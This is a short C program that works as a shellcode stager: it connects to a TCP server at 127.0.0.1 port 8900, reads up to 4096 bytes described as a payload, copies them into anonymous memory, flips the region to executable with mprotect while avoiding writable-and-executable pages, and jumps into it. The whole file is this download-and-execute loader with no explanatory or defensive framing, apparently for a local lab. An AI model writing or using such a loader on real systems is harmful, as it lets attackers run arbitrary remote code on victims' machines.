#include "stdio.h"
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

#include <arpa/inet.h>
#include <sys/socket.h>

#define IP "127.0.0.1"
#define PORT 8900
#define PAYLOAD_MAX_SIZE 4096

int main() {
  struct sockaddr_in serv_addr;
  int status, valread, client_fd;
  char buffer[PAYLOAD_MAX_SIZE] = {0};
  int *addr;

  if ((client_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
    printf("\n Socket creation error \n");
    return -1;
  }

  serv_addr.sin_family = AF_INET;
  serv_addr.sin_port = htons(PORT);

  if (inet_pton(AF_INET, IP, &serv_addr.sin_addr) <= 0) {
    printf("\nInvalid address/ Address not supported \n");
    return -1;
  }

  if ((status = connect(client_fd, (struct sockaddr *)&serv_addr,
                        sizeof(serv_addr))) < 0) {
    printf("\nConnection Failed \n");
    return -1;
  }

  // printf("connected\n");

  // Download the payload from server
  valread = read(client_fd, buffer, PAYLOAD_MAX_SIZE - 1);
  // printf("%s\n", buffer);

  close(client_fd);

  // Mmap anon region in process memory with write permissions
  addr = mmap(NULL, PAYLOAD_MAX_SIZE, PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS,
              -1, 0);

  if (addr == MAP_FAILED) {
    perror("mmap");
  }

  // Copy payload to memory region
  memcpy(addr, buffer, sizeof(buffer));

  // Make region executable, while avoiding making
  // region writable and executable at the same time
  mprotect(addr, PAYLOAD_MAX_SIZE, PROT_EXEC);

  (*(void (*)())addr)();
}
